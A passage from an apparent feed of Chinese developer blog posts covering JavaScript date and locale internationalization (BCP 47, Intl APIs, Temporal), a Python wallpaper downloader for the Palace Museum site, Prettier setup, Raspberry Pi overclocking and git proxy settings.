啊。”</p>\n<blockquote><p>那简体中文呢？</p></blockquote>\n<p>“<code>zh-CN</code>。”你或许会说出这个答案。</p>\n<blockquote><p>那用于新加坡的简体中文和用于中国大陆的简体中文该如何区分呢？</p></blockquote>\n<p>嗯……好问题。</p>\n<p>要能正确区分不同的简体中文，我们还得先回到定义上。实际上，“国际化”并不只是语言的翻译而已，国际化包含的是一整套对于各个<strong>区域</strong>的本地化方案。要准确表示一个国际化方案，我们实际至少需要确定三个属性：语言（Language）、文字（Script）和区域（Locale）。</p>\n<ul>\n<li>\n<strong>语言</strong>通常指的是<strong>声音语言</strong>。不同的语言都有一套自己的发音规则，很难互通。如中文和英语都属于语言</li>\n<li>\n<strong>文字</strong>对应的是某个语言的书写方式，同样的语言可能会有多种书写方案。如中文主要有简体和繁体两种书写方案</li>\n<li>\n<strong>区域</strong>指国际化面向的地区，相同的语言和文字，在不同地区也有可能会有不同的使用习惯。如新加坡和中国大陆都使用简体中文，但两地的用词习惯等有些许差异</li>\n</ul>\n<p>只有确定了这三个属性，我们才能正确定义一个国际化方案（或者说<strong>区域设置</strong>）。当然，还有很多其他属性可以更准确的表达某个区域设置，但通常有语言、文字和区域就已经足够了。</p>\n<p>于是，基于 <a href=\"https://tools.ietf.org/rfc/bcp/bcp47.txt\" rel=\"noopener\">BCP 47</a>，我们可以知道：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN = 中文普通话-简体-中国大陆\ncmn-Hans-SG = 中文普通话-简体-新加坡\ncmn-Hant-TW = 中文普通话-繁体-台湾\nyue-Hant-HK = 中文粤语-繁体-香港</pre>\n<p>等等，这都是啥？还有 BCP 47 又是啥？BCP 是 IETF 发布的“最佳当前实践”文档，而 BCP 47 是一些国际化相关的 ISO 和备忘录的集合，也是目前事实上由 HTML 和 ECMAScript 所使用的表达区域设置的标准。BCP 47 定义的区域设置标签实际上比较复杂，但对于大部分简单使用情况，上文示例中的格式已经完全够用了。简单来说，<strong>要表达一个区域设置，我们会使用 <code>语言[-文字][-区域]</code> 的格式，而文字和区域都是可选的。</strong>而对于每个部分的具体代码，BCP 47 也有做具体定义。其中：</p>\n<ul>\n<li>语言使用 ISO 639-1 定义的两位字母代码（如中文为 <code>zh</code>，英文为 <code>en</code>）或 <a href=\"https://iso639-3.sil.org/code_tables/639/data\" rel=\"noopener\">ISO 639-2/3</a> 定义的三位字母代码（如中文普通话为 <code>cmn</code>，英文为 <code>eng</code>），通常小写</li>\n<li>文字使用 <a href=\"https://unicode.org/iso15924/iso15924-codes.html\" rel=\"noopener\">ISO 15924</a> 定义的四位字母代码，通常首字母大写。如简体中文是 <code>Hans</code>，繁体中文是 <code>Hant</code>\n</li>\n<li>区域通常使用 <a href=\"https://www.iso.org/iso-3166-country-codes.html\" rel=\"noopener\">ISO 3166-1</a> 定义的两位字母代码，通常大写，如中国大陆为 <code>CN</code>，英国为 <code>GB</code>\n</li>\n</ul>\n<blockquote><p>ISO 639-1/2/3 的关系实际是：ISO 639-1 是最早制定的规范，使用两位字母表示语言，但语言数量之多并不能只用两位代码表示。因此后来修订了 ISO 639-2 和 3，使用三位字母表示了更多语言。通常 639-1 代码和 ISO-2/3 代码是一对多的关系。如中文 <code>zh</code> 其实是中文普通话 <code>cmn</code> 的宏语言（macrolanguage），同样使用 <code>zh</code> 为宏语言的语言还有 <code>wuu</code>（中文吴语）、<code>hak</code>（中文客家话）、<code>yue</code>（中文粤语）等数十种。<strong>从规范上我们现在应该使用 ISO 639-2/3 代码来替代 ISO 639-1 代码了</strong>，但由于历史阻力和真实需求中分类无需如此细致等原因，<strong>使用 ISO 639-1 指定语言仍然非常常见而且完全可以接受。</strong>此外，特别地，我们在 ISO 639-3 中定义未指明的语言为 <code>und</code>。</p></blockquote>\n<p>因此，对于这一节开头的两个问题，在 BCP 47 中正确答案其实是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">zh = 中文\ncmn = 中文普通话\n\nzh-Hans = 中文-简体\ncmn-Hans = 中文普通话-简体</pre>\n<p>而 <code>zh-CN</code> 实际是指在中国大陆使用的中文，当然也包含在中国大陆使用的繁体中文。<strong>不过，由于大部分情况下一个区域只会通用一种文字，很多情况下我们可以忽略文字这一项</strong>，即使用 <code>zh-CN</code>（或者 <code>cmn-CN</code>）来表示中国大陆的简体中文普通话——毕竟在大部分业务中在中国大陆使用繁体和非普通话的情况非常少。</p>\n<blockquote><p>事实上，类似 <code>zh-Hans</code> 和 <code>zh-Hant</code> 开头的区域设置名称已经被标记为 <code>redundant 废弃</code>，因此尽可能只使用 <code>zh-CN</code> 或者 <code>cmn-Hans-CN</code> 这样的区域设置名称。所有区域设置名称的列表可以在 <a href=\"https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry\" rel=\"noopener\">IANA</a> 找到。</p></blockquote>\n<p>现在我们可以准确定义一个区域设置了。不过我们还有一些小小的需求。比如我们想在 <code>cmn-Hans-CN</code> 的区域设置中使用农历来表示日期，但显然我们上文定义的表示方法并不能表达这一需求。好在，Unicode 为 BCP 47 提供了 u 扩展。在区域设置名称后面加上 <code>-u-[选项]</code> 就可以表达更细致的变体了。所以我们有：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN-u-ca-chinese = 中文普通话-简体-中国大陆-u-日历-中国农历\njpn-Jpan-JP-u-ca-japanese = 日语-日文汉字/平假名/片假名-日本-u-日历-日本日历\ncmn-Hans-CN-u-nu-hansfin = 中文普通话-简体-中国大陆-u-数字-简体大写数字</pre>\n<p>u 扩展的具体可选项可以在 <a href=\"https://www.unicode.org/reports/tr35/tr35-21.html#Unicode_locale_identifier\" rel=\"noopener\">Unicode 网站</a>上找到。而多个 u 扩展还可以连接——于是我们甚至可以写出 <code>cmn-Hans-CN-u-ca-chinese-nu-hansfin</code> 这种丧心病狂的区域设置名称。当然，相信你现在已经可以看懂这个区域设置的意思了。</p>\n<blockquote><p>不同地区可能会有不同的日历使用习惯，如中国有使用农历的需求，泰国有使用佛历的需求，我们可以通过 u 扩展指定不同的日历。不过，大部分情况下我们会使用标准的 ISO 8601 日历（gregory），JavaScript 的 <code>Date</code> 对象也只支持这种日历。</p></blockquote>\n<blockquote><p>你可以使用 <a href=\"https://r12a.github.io/app-subtags/\" rel=\"noopener\">BCP47 language subtag lookup</a> 工具快速检查你编写的 BCP 47 区域标签是否规范。</p></blockquote>\n<p>终于我们可以正确表达一个完美符合我们需求的区域设置了。接下来，让我们开始格式化时间吧。</p>\n<h1>格式化时间</h1>\n<p>这题我会！</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const formatDate(date) =&gt; {\n    return `${date.getFullYear()}-${`${date.getMonth() + 1}`.padStart(2, '0')}-${`${date.getDate()}`.padStart(2, '0')} ${`${date.getHours()}`.padStart(2, '0')}:${`${date.getMinutes()}`.padStart(2, '0')}:${`${date.getSeconds()}`.padStart(2, '0')}`\n}\n\nformatDate(new Date()) // 2021-10-13 01:00:00</pre>\n<p>就完事了……吗？先不论这样的格式化代码难以阅读，尽管上文这样的日期格式国际通用，<strong>但并非所有区域都习惯于这样的日期表示方法。</strong>比如英语国家/地区在很多时候习惯在日期中加入星期，而阿拉伯语国家/地区在部分情况下习惯使用阿拉伯语数字（而非常用的阿拉伯-印度数字）；再比如美式英语国家/地区习惯月-日-年的日期表示法，而英式英语国家/地区习惯日-月-年的日期表示法……不同区域在时间表示格式习惯上的差异是巨大的，<strong>我们很难通过一个简单的方法来正确地、国际化地格式化一个日期。</strong></p>\n<p>好在 ES6 早就为我们铺平了道路。还记得上文提到过的 <code>Intl.DateTimeFormat</code> 吗？我们通过它来实例化一个日期格式化器并用进行日期的国际化。</p>\n<p>直接来看例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const options = {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    weekday: 'long'\n}\nconst now = new Date()\n\nconst enUSFormatter = new Intl.DateTimeFormat('en-US', options)\n\nconst zhCNFormatter = new Intl.DateTimeFormat('zh-CN', options)\nconst zhCNAltFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', options)\nconst zhCNAlt2Formatter = new Intl.DateTimeFormat('zh-CN-u-ca-roc-nu-hansfin', options)\n\nconst jaFormatter = new Intl.DateTimeFormat('ja', options)\nconst jaAltFormatter = new Intl.DateTimeFormat('ja-JP-u-ca-japanese', options)\n\nconst arEGFormatter = new Intl.DateTimeFormat('ar-EG', options)\n\nenUSFormatter.format(now) // Wednesday, Oct 13, 2021\n\nzhCNFormatter.format(now) // 2021年10月13日星期三\nzhCNAltFormatter.format(now) // 2021辛丑年九月8星期三\nzhCNAlt2Formatter.format(now) // 民国壹佰壹拾年拾月拾叁日星期三\n\njaFormatter.format(now) // 2021年10月13日水曜日\njaAltFormatter.format(now) // 令和3年10月13日水曜日\n\narEGFormatter.format(now) // الأربعاء، ١٣ أكتوبر ٢٠٢١</pre>\n<blockquote><p>在这里我们使用 ISO 639-1 代码来表示语言，是由于事实上 ISO 639-1 代码更加常见与通用。在大部分支持 <code>Intl.DateTimeFormat</code> 的 JavaScript 运行时中我们也可以使用 ISO 639-2/3 代码来表示语言（但实际会 fallback 至对应的 ISO 639-1 代码）。</p></blockquote>\n<blockquote><p>你也可以通过在 <code>options</code> 中设置 <code>calendar</code> 属性和 <code>numberingSystem</code> 属性来替换区域设置名称中对 u 扩展的使用。这也是推荐方式。</p></blockquote>\n<p>这非常直观，我们可以指定区域设置和格式化选项来初始化一个格式化器，并在之后使用格式化器对象的 <code>format</code> 方法来格式化一个 <code>Date</code> 对象。这里的格式化选项其实非常灵活，能格式化的不只是日期，时间也可以被灵活地格式化，有非常多的组合可以选择。我们不会在这里详细解释每一个选项，你可以访问 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat\" rel=\"noopener\">MDN 文档</a>来了解更多。</p>\n<blockquote><p>如前文所述，<code>Intl.DateTimeFormat</code> 无法格式化毫秒。</p></blockquote>\n<p>不过需要注意的是，<strong>JavaScript 运行时不一定支持所有区域设置，也不一定支持所有格式化选项。</strong>在遇到不支持的情况时，<code>Intl.DateTimeFormat</code> 默认会静默 fallback 到最匹配的支持项，因此在处理不常见的区域设置或选项时，你可能需要再额外检查。你可以通过 <code>Intl.DateTimeFormat.supportedLocalesOf()</code> 静态方法判断当前运行时是否支持指定的区域设置，也可以在实例化格式化器后在对象上调用 <code>resolvedOptions()</code> 方法来检查运行时的解析结果是否与预期一致。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('yue-Hant-CN').resolvedOptions()\n// {locale: 'zh-CN', calendar: 'gregory', …}\n// fallback 至 zh-CN，与 yue-CN 的预期不一致</pre>\n<p>此外，正如你所看到的，各种语言在日期格式化中使用的文本 JavaScript 运行时都已经帮我们内置了。因此，我们甚至可以利用这些国际化特性来为我们的应用减少一点需要翻译的字符串——打包进应用的翻译越少，应用体积也就越小了嘛——比如说获取一周七天对应的名字：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getWeekdayNames = (locale) =&gt; {\n     // 基于一个固定日期计算，这里选择 1970.1.1\n     // 不能使用 0，因为 Unix 时间戳 0 在不同时区的日期不一样\n    const base = new Date(1970, 0, 1).getTime()\n    const formatter = new Intl.DateTimeFormat(locale, { weekday: 'short' })\n    return Array.from({ length: 7 }, (_, day) =&gt; (\n        formatter.format(new Date(base + 3600000 * 24 * (-4 + day))) // 1970.1.1 是周四\n    ))\n}\n\ngetWeekdayNames('en-US') // ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']\ngetWeekdayNames('zh-CN') // ['周日', '周一', '周二', '周三', '周四', '周五', '周六']\ngetWeekdayNames('ja') // ['日', '月', '火', '水', '木', '金', '土']\ngetWeekdayNames('ar-EG') // ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت']</pre>\n<p>当然，如果你还是不喜欢运行时为你提供的格式，我们还有上文提到过的 <code>formatToParts()</code> 方法可以用。来看一个简单的例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('zh-CN', {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    weekday: 'long',\n    hour: 'numeric',\n    minute: 'numeric',\n    second: 'numeric',\n}).formatToParts(new Date())\n// [\n//     { type: 'year', value: '2021' },\n//     { type: 'literal', value: '年' },\n//     { type: 'month', value: '10' },\n//     { type: 'literal', value: '月' },\n//     { type: 'day', value: '13' },\n//     { type: 'literal', value: '日' },\n//     { type: 'weekday', value: '星期三' },\n//     { type: 'literal', value: ' ' },\n//     { type: 'dayPeriod', value: '上午' },\n//     { type: 'hour', value: '1' },\n//     { type: 'literal', value: ':' },\n//     { type: 'minute', value: '00' },\n//     { type: 'literal', value: ':' },\n//     { type: 'second', value: '00' }\n// ]</pre>\n<p>随后，你就可以自己解析这个数组来构造出你想要的时间格式了。最后，我们还可以使用 <code>Intl.RelativeTimeFormat</code> 来格式化相对日期。当然我们不会在这里详细讲解这个 API，你可以参考 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/RelativeTimeFormat\" rel=\"noopener\">MDN 文档</a>。直接来看一个简单例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getRelativeTime = (num, unit, locale) =&gt; {\n    return new Intl.RelativeTimeFormat(locale, { numeric: 'auto' }).format(num, unit)\n}\n\ngetRelativeTime(-3, 'day', 'en-US') // 3 days ago\ngetRelativeTime(-1, 'day', 'zh-CN') // 昨天\ngetRelativeTime(0, 'second', 'zh-CN') // 现在\ngetRelativeTime(3, 'hour', 'ja') // 3 時間後</pre>\n<blockquote><p><code>Intl.RelativeTimeFormat</code> 是一个相对较晚进入标准的对象，因此浏览器支持程度较差，可能需要使用 <a href=\"https://formatjs.io/docs/polyfills/intl-relativetimeformat\" rel=\"noopener\">Polyfill</a>。不过目前（2021.10）主流浏览器的最新版本均已支持此 API。</p></blockquote>\n<h1>未来</h1>\n<p>我希望这篇文章时区转换的部分可以很快过时——这并非无稽之谈，目前（2021.10）TC39 的 <a href=\"https://github.com/tc39/proposal-temporal\" rel=\"noopener\"><code>Temporal</code> 提案</a>已经进入 Stage 3 了。<strong><code>Temporal</code> 提案定义了一个新的、时区友好的 <code>Temporal</code> 命名空间，并期望在不久后就能进入标准并最终应用于生产环境。</strong><code>Temporal</code> 定义了完整的时区、时间段、日历规则的处理，且拥有简单明了的 API。那时候，JavaScript 的时区处理就不会再如此痛苦了。由于目前 <code>Temporal</code> 提案还未进入标准，API 暂未稳定，我们无法将其用于生产环境，但我们可以来看一个简单的例子感受一下这个 API 的强大。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const zonedDateTime = Temporal.ZonedDateTime.from({\n  timeZone: 'America/Los_Angeles',\n  year: 1995,\n  month: 12,\n  day: 7,\n  hour: 3,\n  minute: 24,\n  second: 30,\n  millisecond: 0,\n  microsecond: 3,\n  nanosecond: 500,\n  calendar: 'iso8601'\n}) // 1995-12-07T03:24:30.0000035-08:00[America/Los_Angeles]</pre>\n<p>如果你希望立刻开始使用 <code>Temporal</code>，现在已有 Polyfill 可用。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"js-temporal\" data-mdxgithubp=\"temporal-polyfill\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/js-temporal/temporal-polyfill\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>不过，时区问题不会消失，各地区的习惯也很难融合到一起。时间的国际化处理是<a href=\"https://yourcalendricalfallacyis.com/\" rel=\"noopener\">极其复杂</a>的，前端中的时间国际化仍然值得我们认真关注。</p>\n","link":"https://flyhigher.top/develop/2482.html"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" 